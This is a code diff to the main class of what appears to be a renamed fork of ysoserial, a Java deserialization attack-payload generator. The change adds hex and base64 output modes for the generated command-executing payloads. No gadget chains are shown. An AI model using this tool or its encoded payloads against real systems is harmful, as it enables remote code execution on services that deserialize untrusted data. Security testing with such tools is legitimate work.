@@ -1,5 +1,6 @@
 package mysocall;
 
+import java.io.ObjectOutputStream;
 import java.io.PrintStream;
 import java.util.*;
 
@@ -7,6 +8,7 @@ import mysocall.payloads.ObjectPayload;
 import mysocall.payloads.ObjectPayload.Utils;
 import mysocall.payloads.annotation.Authors;
 import mysocall.payloads.annotation.Dependencies;
+import mysocall.payloads.util.Common;
 
 @SuppressWarnings("rawtypes")
 public class GeneratePayload {
@@ -14,7 +16,7 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
+		if (args.length < 2) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
@@ -32,8 +34,25 @@ public class GeneratePayload {
 		try {
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
-			PrintStream out = System.out;
-			Serializer.serialize(object, out);
+			if (args.length >= 3) {
+				byte[] data = Serializer.serialize(object);
+				switch (args[2]) {
+					case "-h" :
+						System.out.println(Common.bytesToHex(data));
+						break;
+					case "-b":
+						System.out.println(Common.base64Encode(data));
+						break;
+					default:
+						ObjectOutputStream objOut = new ObjectOutputStream(System.out);
+						objOut.writeObject(object);
+						break;
+				}
+			} else {
+				PrintStream out = System.out;
+				Serializer.serialize(object, out);
+			}
+
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
@@ -45,7 +64,7 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
+		System.err.println("Usage: java -jar mysocall-[version]-all.jar [payload] '[command]' [-h|-b]");
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
